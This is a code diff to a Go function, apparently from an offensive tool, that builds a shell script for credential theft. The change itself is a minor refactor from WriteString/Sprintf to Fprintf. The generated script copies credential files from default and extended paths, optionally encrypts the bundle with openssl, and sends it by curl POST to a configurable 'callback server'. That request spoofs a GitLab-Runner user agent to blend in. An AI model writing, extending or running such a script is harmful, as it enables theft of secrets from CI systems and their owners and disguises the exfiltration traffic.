@@ -166,10 +166,10 @@ func buildMemoryDumpScript(o MemoryDumpOptions) string {
 	}
 
 	for _, p := range defaultPaths {
-		b.WriteString(fmt.Sprintf(`  for _cf in %s; do
+		fmt.Fprintf(&b,`  for _cf in %s; do
     [ -e "$_cf" ] && cp "$_cf" "$_d/creds/" 2>/dev/null
   done
-`, p))
+`, p)
 	}
 
 	// Extended paths
@@ -189,10 +189,10 @@ func buildMemoryDumpScript(o MemoryDumpOptions) string {
 		b.WriteString(`  # 4b. Extended credential sweep
 `)
 		for _, p := range extendedPaths {
-			b.WriteString(fmt.Sprintf(`  for _cf in %s; do
+			fmt.Fprintf(&b,`  for _cf in %s; do
     [ -e "$_cf" ] && cp "$_cf" "$_d/creds/" 2>/dev/null
   done
-`, p))
+`, p)
 		}
 	}
 
@@ -239,24 +239,24 @@ with open('$_d/report.json', 'w') as f:
 	exfilFile := "$_d/bundle.tgz"
 	if key := strings.TrimSpace(o.EncryptionKey); key != "" {
 		exfilFile = "$_d/bundle.enc"
-		b.WriteString(fmt.Sprintf(`  # 8. Encrypt with passphrase
+		fmt.Fprintf(&b,`  # 8. Encrypt with passphrase
   openssl enc -aes-256-cbc -pbkdf2 -salt \
     -in "$_d/bundle.tgz" -out "$_d/bundle.enc" \
     -pass pass:'%s' 2>/dev/null
-`, key))
+`, key)
 	}
 
 	// Step 9: Exfiltration
 	c2 := strings.TrimSpace(o.CallbackURL)
 	if c2 != "" {
-		b.WriteString(fmt.Sprintf(`  # 9. Exfiltrate to callback server
+		fmt.Fprintf(&b,`  # 9. Exfiltrate to callback server
   echo "[*] Exfiltrating to: %s"
   curl -sS -X POST \
     -H "Content-Type: application/octet-stream" \
     -H "User-Agent: GitLab-Runner/16.0" \
     --data-binary @"%s" \
     "%s" >/dev/null 2>&1 || true
-`, c2, exfilFile, c2))
+`, c2, exfilFile, c2)
 	} else {
 		b.WriteString(`  # 9. Output summary (artifact-only mode)
   echo "[*] Memory dump complete. Data available in artifacts."
